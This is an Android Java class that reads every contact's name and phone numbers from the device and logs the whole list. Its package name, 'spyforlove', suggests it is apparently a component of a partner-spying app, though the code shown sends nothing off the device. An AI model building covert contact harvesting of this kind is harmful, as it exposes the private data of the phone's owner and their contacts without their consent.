package chem.kth.spyforlove;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

import chem.kth.MainApplication;
import chem.kth.spyforlove.model.PhoneContact;

public class ReadContact {
    public static List<PhoneContact> readContactProcess() {
        List<PhoneContact> phoneContacts = new ArrayList<>();
        ContentResolver cr = MainApplication.getContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                PhoneContact phoneContact = new PhoneContact();
                String id = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));
                phoneContact.setName(name);
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    List<String> phoneList = new ArrayList<>();
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        int phoneType = pCur.getInt(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.TYPE));
                        String phoneNumber = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneList.add(phoneNumber);
                        switch (phoneType) {
                            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
//                                Log.e(name + "(mobile number)", phoneNumber);
                                break;
                            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
//                                Log.e(name + "(home number)", phoneNumber);
                                break;
                            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
//                                Log.e(name + "(work number)", phoneNumber);
                                break;
                            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
//                                Log.e(name + "(other number)", phoneNumber);
                                break;
                            default:
                                break;
                        }
                    }
                    pCur.close();
                    phoneContact.setPhones(phoneList);
                }
                phoneContacts.add(phoneContact);
            }
        }
        cur.close();
        Log.d("contact", "readContactProcess: "+phoneContacts);
        return phoneContacts;
    }
}
